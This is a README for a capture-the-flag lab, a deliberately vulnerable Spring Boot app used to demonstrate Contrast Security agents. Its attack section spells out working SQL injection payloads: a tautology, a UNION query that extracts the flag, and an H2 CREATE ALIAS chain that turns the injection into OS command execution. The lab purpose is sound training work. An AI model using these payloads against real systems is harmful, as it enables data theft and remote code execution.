# SQL CTF

## Setup

To run you will need
* Java 11 to build
* Docker
* contrast_security.yaml
* Contrast agent jar.

This will run two web applications on port 8080 and 8081.
App with Protect and Assess is on port 8080.
App with only Assess is on port 8081.
To access go to http://localhost:8080 ( Protect & Assess ) or http://localhost:8081 ( Assess )

Modify the contrast_security.yaml and contrast_security_with_protect.yaml files to point to your Teamserver and add credentials.
Download a contrast agent jar file and place it under
contrast/ directory and name it contrast.jar e.g
contrast/contrast.jar

## Run

To run. 
./run.sh
Then enter the flag text. This will be embeded into the TBL_SECRET of the application running with protect. The attacker needs to retrieve this to win the game.
The flag of the application not running assess will always be CONTRAST-CAT.


## Application

The application is a simple Spring Boot application with two endpoints.
http://localhost:8080/getFirstNames
which returns a list of the first names from the database
http://localhost:8080/getEmail?firstName=XXX
Which when given a first name will return the email associated with it.
There is a web page under http://localhost:8080
Which builds up the user table shown by first calling the 
/getFirstNames endpoint. Then for each name found, calls the /getEmails endpoint.
This should be enough to signpost the location of the vulnerable endpoint. ( It is visible in the browser developer console )



## Database

The database is an in memory H2 database. All changes made are lost when the application is killed and restarted, so any attacker's modifications will not persist after restart.
If you want to modify the existing data, edit the data.sql or schema.sql files.
The database consists of two tables :

TBL_USERS contains user information first/last name, email.

TBL_SECRET contains a single field called "flag".
This is the CTF flag that the attacker needs to retrieve to win.


## Potential Attacks

The application is running the latest version of Spring. It "should" be only vulnerable to a SQL Injection attack against the
/getEmail endpoint.
Potential attacks include.
**' OR 1 = 1--**

`/getEmail?firstName=%27%20OR%201%20%3D%201--`

Which returns all email addresses in email table concatenated together.

### A union statement to retrieve the secret

**' UNION SELECT flag FROM TBL_SECRET--**

`/getEmail?firstName=%27%20UNION%20SELECT%20flag%20FROM%20TBL_SECRET--
`
This should only be possible on the application that doesn't have protect enabled. But it will be flagged by assess.

### SQL Injection to RCE 

A more interesting attack is to leverage the ALIAS functionality in the H2 database to get remote code execution.
First
You need to create a ALIAS function in the database
**' CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',
HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();
rt.exec(cmd);',HEXTORAW('007d'));--** 

Which is

`/getEmail?firstName=%27%20CREATE%20ALIAS%20EXEC%20AS%20CONCAT%28%27void%20e%28String%20cmd%29%20throws%20java.io.IOException%27%2C%0A%20%20%20%20%20%20HEXTORAW%28%27007b%27%29%2C%27java.lang.Runtime%20rt%3D%20java.lang.Runtime.getRuntime%28%29%3B%0A%20%20%20%20%20%20rt.exec%28cmd%29%3B%27%2CHEXTORAW%28%27007d%27%29%29%3B--%20
`

This creates a function named EXEC()

Then call it using

**'; CALL EXEC('touch /tmp/blablabla');--**

`/getEmail?firstName=%27%3B%20CALL%20EXEC%28%27touch%20%2Ftmp%2Fblablabla%27%29%3B--%20
`

You only need to call the first part of the attack once to create the exec() function. Once that is done the second command can be used to execute the code which in turn executes a command.
The actual command used can of course be modified.
When the above attack is run, Assess will show both SQL Injection and OS command injection vulnerabilities.


